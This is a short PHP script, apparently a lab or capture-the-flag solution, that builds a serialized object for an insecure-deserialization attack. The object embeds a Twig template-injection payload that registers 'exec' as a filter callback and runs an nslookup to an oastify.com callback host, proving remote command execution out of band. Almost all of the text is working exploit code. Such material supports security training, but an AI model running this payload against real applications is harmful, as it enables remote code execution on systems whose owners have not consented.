<?php
class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

}
class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }
}

$blog = new Blog('user', '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nslookup 6ipgpx8n430hiho2efhron5llcr3ft3i.oastify.com")}}');
$object = new CustomTemplate($blog);

$serialized = serialize($object);
echo $serialized . "\n";
